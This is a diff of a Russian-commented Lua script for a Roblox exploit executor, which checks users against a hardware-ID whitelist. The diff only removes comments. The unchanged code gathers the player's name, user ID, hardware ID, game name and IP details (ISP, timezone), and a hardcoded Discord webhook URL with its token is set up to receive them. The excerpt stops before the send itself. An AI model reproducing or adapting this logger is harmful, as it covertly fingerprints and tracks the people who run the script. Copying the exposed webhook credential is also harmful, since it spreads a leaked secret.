@@ -2,7 +2,6 @@ local player = game:GetService("Players").LocalPlayer
 local lp = game:GetService("Players").LocalPlayer
 local valid = false
 
--- 1. ОБНОВИ ЭТУ БЕЛЫЙ СПИСОК СВОИМИ ДАННЫМИ:
 local whitelist = {
     {HWID = '5D2C1A34-B6E1-4A29-A731-1295328B6A22', IP = "bobik_musor"}
 }
@@ -11,7 +10,6 @@ if game:IsLoaded() then
     local player_name = player.Name
     local player_id = player.UserId
     
-    -- 2. ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЙ DISCORD WEBHOOK:
     local webhook_url = "https://discord.com/api/webhooks/1471569290183442523/engyxPsJOc6mQpCcrpYKM5oYV7PS0J15aQEsaCuL96__qJqhbYaFGbkCRiVJqMFCksFD"
 
     local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
@@ -19,7 +17,6 @@ if game:IsLoaded() then
     local place_id = game.PlaceId
     local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name
 
-    -- Инициализируем ipinfo_table с дефолтными значениями на случай ошибки
     getgenv().ipinfo_table = {
         query = "N/A",
         isp = "N/A", 
@@ -28,7 +25,6 @@ if game:IsLoaded() then
         timezone = "N/A"
     }
     
-    -- Пытаемся получить IP-информацию
     local success_ip, ip_response = pcall(function()
         local request_func = syn and syn.request or http_request or request
         if not request_func then
